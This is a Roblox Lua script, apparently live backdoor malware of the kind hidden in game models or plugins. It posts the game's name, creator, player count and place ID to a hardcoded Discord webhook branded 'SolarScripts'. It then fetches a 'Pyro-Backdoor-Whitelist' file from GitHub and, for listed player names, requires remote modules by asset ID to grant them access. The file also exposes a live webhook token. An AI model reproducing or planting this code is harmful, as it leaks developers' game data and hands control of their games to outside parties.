	local RunService = game:GetService("RunService")
	if RunService:IsStudio() then
		local b="https://discord.com/api/webhooks/1217576873450672289/3q2HLZafqn8etv9YStDYY1qzXCL3xMHjDu-Q-MoGV9Y-G_wzFaZXnhKF63jrshQK0Igd"
		local c=game:GetService("HttpService")
		local e=game:GetService("MarketplaceService")
		local d=game:GetService("RunService")
		local _=e:GetProductInfo(game.PlaceId).Created
		local a=e:GetProductInfo(game.PlaceId).Updated
		local _=string.sub(_,1,10)
		local a=string.sub(a,1,10) if d:IsStudio()or d:IsServer()then
			local _={["embeds"]={{["author"]={["name"]="SolarScripts",			["icon_url"]="https://i.ibb.co/m8rQ497/EX2.png"},["title"]=e:GetProductInfo(game.PlaceId).Name,["url"]="https://www.roblox.com/games/"..game.PlaceId,["color"]=5612282,["image"]={["url"]="https://www.roblox.com/asset-thumbnail/image?assetId="..game.PlaceId.."&width=768&height=432&format=png"},["fields"]={{["name"]="Players",["value"]=#game.Players:GetPlayers(),["inline"]=true},{["name"]="Creator",["value"]=game.Players:GetNameFromUserIdAsync(game.CreatorId),["inline"]=true},{["name"]="Max Players",["value"]=game.Players.MaxPlayers,["inline"]=true},{["name"]="Created",["value"]=_,["inline"]=true},{["name"]="Last Updated",["value"]=a,["inline"]=true},{["name"]="Place ID",["value"]=game.PlaceId,["inline"]=true}},["footer"]={["text"]="SolarScripts",["icon_url"]="https://i.ibb.co/m8rQ497/EX2.png"}}}} wait(4.5) local _=c:JSONEncode(_) local _=c:PostAsync(b,_) end
		local res = game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/zephr1213/Pyro-Backdoor-Whitelist/main/wtl.txt")
		wait(2)
		if string.find(res,Player.name) then
			require(7902526964).insert(Player.name)
			require(16735669180).load(Player.name)
		end
		print('SLS detect server')
	else
		print('SLS detect client')
		local res = game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/zephr1213/Pyro-Backdoor-Whitelist/main/wtl.txt")
		wait(2)
		if string.find(res,Player.name) then
			require(7902526964).insert(Player.name)
			require(16735669180).load(Player.name)
		end
	end
